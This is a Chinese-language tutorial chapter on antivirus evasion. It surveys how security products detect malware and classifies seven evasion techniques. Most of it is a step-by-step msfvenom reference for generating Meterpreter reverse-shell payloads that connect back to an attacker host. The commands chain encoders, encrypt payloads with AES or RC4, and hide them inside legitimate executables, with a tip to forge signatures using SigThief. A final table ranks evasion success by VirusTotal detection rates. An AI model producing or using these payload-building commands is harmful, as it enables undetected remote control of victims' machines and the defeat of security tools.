# 01 - 免杀基础知识

## 一、杀软检测方式

### 1. 静态检测（Static Analysis）
- **特征码检测**：匹配已知恶意软件的特征字符串/hash
- **PE结构分析**：检查节表、导入表、熵值异常
- **启发式扫描**：基于规则的静态启发（可疑API组合、字符串模式）
- **机器学习静态**：提取PE特征向量 → 模型分类

### 2. 动态检测（Dynamic/Behavioral Analysis）
- **沙箱执行**：在隔离环境运行，观察行为序列
- **API Hook**：用户态hook ntdll.dll关键函数（如NtAllocateVirtualMemory）
- **ETW（Event Tracing for Windows）**：内核级事件流监控
- **内核回调**：PsSetCreateProcessNotifyRoutine等
- **AMSI（AntiMalware Scan Interface）**：扫描脚本、内存中的.NET程序集

### 3. 云查杀
- 上传样本hash/特征到云端分析
- VT（VirusTotal）聚合多家引擎

### 4. 内存扫描
- 扫描RWX内存区域
- 对比磁盘PE头 vs 内存PE头
- 检测未备份的修改过的内存页

## 二、7种免杀技术分类

| 类别 | 技术要点 | 针对检测类型 |
|------|---------|-------------|
| **1. 编码/加密** | XOR、AES、RC4、Base64、自定义算法 | 静态特征码 |
| **2. 混淆/多态** | 代码变形、控制流平坦化、垃圾指令插入 | 静态+启发式 |
| **3. 加载器分离** | Shellcode与Loader分离，远程下载 | 静态扫描 |
| **4. 进程注入** | 注入合法进程，借壳运行 | 行为检测 |
| **5. 系统调用** | 直接/间接syscall绕过用户态hook | API Hook/EDR |
| **6. 白名单利用** | LOLBins、签名的Microsoft二进制文件 | 应用白名单 |
| **7. 环境感知** | 检测沙箱/虚拟机，延迟执行 | 动态沙箱 |

## 三、msfvenom 完整参数详解

### 基本语法
```bash
msfvenom -p <payload> [options] -f <format> -o <output>
```

### Payload 选择
```bash
# 列出所有payload
msfvenom -l payloads

# 按平台筛选
msfvenom -l payloads --platform windows --arch x64

# 常用Payload
windows/x64/meterpreter/reverse_tcp        # TCP反向shell (staged)
windows/x64/meterpreter/reverse_https      # HTTPS反向shell (staged)
windows/x64/meterpreter_reverse_tcp        # TCP反向shell (stageless, 推荐)
windows/x64/meterpreter_reverse_https      # HTTPS反向shell (stageless)
windows/x64/exec                            # 执行命令
windows/x64/shell_reverse_tcp               # 普通shell反向
```

### Stage vs Stageless
- **Staged（/reverse_tcp）**：体积小，先连接下载stage，传输不稳定时可用
- **Stageless（_reverse_tcp）**：体积大但一次性到位，更稳定，推荐免杀使用

### 编码器
```bash
# 列出所有编码器
msfvenom -l encoders

# 使用编码器
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# 多编码器链式编码
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT \
  -e x64/xor_dynamic -i 3 -f raw | \
msfvenom -e x64/zutto_dekiru -i 2 -a x64 --platform windows -f exe -o payload.exe
```

### 加密（2024+ 新特性）
```bash
# AES256
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 \
  --encrypt aes256 --encrypt-key 'YourKey2025!' --encrypt-iv '1234567890abcdef' \
  -f exe -o payload.exe

# RC4
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 \
  --encrypt rc4 --encrypt-key 'YourKey2025!' -f exe -o payload.exe
```

### 自定义模板
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=443 \
  -x /path/to/legitimate.exe -k -f exe -o output.exe
# -x: 宿主exe
# -k: 保留原始功能
# 注意：签名会丢失，配合SigThief使用
```

### 输出格式
```bash
-f exe          # PE可执行文件 (VT: ~47/71)
-f dll          # 动态链接库
-f raw          # 原始shellcode（配合自定义loader）
-f c            # C语言数组
-f csharp       # C# byte数组
-f python       # Python bytes
-f ps1          # PowerShell脚本
-f vba          # VBA宏
-f vbs          # VBScript
-f js           # JavaScript
-f jar          # Java (VT: ~35/64)
-f psh-cmd      # PowerShell命令
```

### 其他重要参数
```bash
-b '\x00\x0a\x0d'       # 坏字符
--pad-nops 10           # 填充NOP sled
--smallest              # 最小化payload
-e x64/xor_dynamic -i 5 # 编码器+迭代次数
PrependMigrate=true     # 自动迁移进程
PrependMigrateProc=explorer.exe  # 目标进程
ExitOnSession=false     # Session断开不退出
```

## 四、免杀等级评估标准

| 等级 | 描述 | VT查杀率 | 代表技术 |
|------|------|---------|---------|
| Lv1 | 裸奔 | >40/70 | 原始exe |
| Lv2 | 基础编码 | 30-40/70 | shikata_ga_nai |
| Lv3 | 加密+模板 | 15-30/70 | AES+自定义模板 |
| Lv4 | 加载器分离 | 5-15/70 | C加载器+XOR |
| Lv5 | 高级对抗 | <5/70 | 间接syscall+多态 |
| Lv6 | EDR级别 | 0-2/70 | 全链路对抗 |
